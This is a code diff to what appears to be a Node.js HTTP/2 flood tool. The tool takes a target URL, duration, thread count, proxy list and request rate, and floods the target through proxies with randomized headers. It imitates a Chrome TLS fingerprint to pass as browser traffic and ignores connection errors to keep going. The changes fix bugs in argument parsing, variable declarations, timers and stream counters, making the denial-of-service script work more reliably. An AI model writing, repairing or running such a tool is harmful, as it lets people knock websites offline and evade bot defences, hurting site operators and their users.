@@ -29,7 +29,7 @@ function c1(settings) {
 }
 const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
 // Chrome 146 cipher suites - exact order from TLS fingerprint
-cplist = [
+const cplist = [
 		'TLS_AES_128_GCM_SHA256',
 		'TLS_AES_256_GCM_SHA384',
 		'TLS_CHACHA20_POLY1305_SHA256',
@@ -62,7 +62,7 @@ const sigalgs = [
 ];
 let sig = sigalgs.join(':');
 
-controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400']
+const controle_header = ['no-cache', 'no-store', 'no-transform', 'only-if-cached', 'max-age=0', 'must-revalidate', 'public', 'private', 'proxy-revalidate', 's-maxage=86400']
 	, ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError']
 	, ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];
 const n = {
@@ -80,15 +80,16 @@ process.on('uncaughtException', function(e) {
 }).setMaxListeners(0);
 
 const target = process.argv[2];
-const time = process.argv[3];
+const time = parseInt(process.argv[3], 10);
 const thread = process.argv[4];
 const proxyFile = process.argv[5];
-const rps = process.argv[6];
+const rps = parseInt(process.argv[6], 10);
 if (!/^https?:\/\//i.test(target)) {
 	console.error('sent with http:// or https://');
 	process.exit(1);
 }
-proxyr = proxyFile
+const proxyr = proxyFile;
+let shouldPauseRequests = false;
 if (isNaN(rps) || rps <= 0) {
 	console.error('number rps');
 	process.exit(1);
@@ -126,7 +127,7 @@ if (cluster.isMaster) {
 	setInterval(m, 5000);
 	setTimeout(() => process.exit(-1), time * 1000);
 } else {
-	setInterval(d)
+	setInterval(d, 500)
 }
 
 function d() {
@@ -155,18 +156,6 @@ return characters[randomIndex];
 return randomStringArray.join('');
 }
 
-	const fsValue = f(25);
-function g(minLength, maxLength) {
-					const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
-  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
-  const randomStringArray = Array.from({ length }, () => {
-    const randomIndex = Math.floor(Math.random() * characters.length);
-    return characters[randomIndex];
-  });
-
-  return randomStringArray.join('');
-}
-const hd = {}
  function h(min, max) {
   return Math.floor(Math.random() * (max - min + 1)) + min;
 }
@@ -286,7 +275,7 @@ const headers = j(browser);
 			, 'Connection': 'Keep-Alive'
 		, }
 	, };
-	connection = http.request(Optionsreq, (res) => {});
+	const connection = http.request(Optionsreq, (res) => {});
 	// Chrome 146 TLS options - matching real browser fingerprint
 	const cipherString = tls12Ciphers.join(':');
 	const TLSOPTION = {
@@ -369,13 +358,15 @@ b(0, 8, updateWindow)
     });
 
     clients.forEach(client => {
+        let streamId = 1;
+        let streamIdReset = 1;
+        let count = 0;
         const intervalId = setInterval(async () => {
             const requests = [];
-            let count = 0;
 
                 // Use exact Chrome 146 headers from j
                 const head = { ...headers };
-                            
+
                 if (tlsSocket && !tlsSocket.destroyed && tlsSocket.writable) {
                 for (let i = 0; i < rps; i++) {
                 const requestPromise = new Promise((resolve, reject) => {
@@ -396,23 +387,20 @@ b(0, 8, updateWindow)
                     clearInterval(intervalId);
                     client.close(http2.constants.NGHTTP2_CANCEL);
                     client.goaway(0, http2.constants.NGHTTP2_HTTP_1_1_REQUIRED, Buffer.from('NATRAL'));
-                    } else if (count=== rps) {
+                    } else if (count === rps) {
                     client.close(http2.constants.NGHTTP2_CANCEL);
                     client.destroy();
                     clearInterval(intervalId);
                     }
                     reject(new Error('Request timed out'));
                     });
-                    request.end(http2.constants.ERROR_CODE_PROTOCOL_ERROR);
+                    request.end();
                 });
 
                 const packed = Buffer.concat([
                     Buffer.from([0x80, 0, 0, 0, 0xFF]),
                     hpack.encode(head)
                 ]);
-
-                let streamId =1;
-                let streamIdReset = 1;
                 const flags = 0x1 | 0x4 | 0x8 | 0x20;
                 
                 
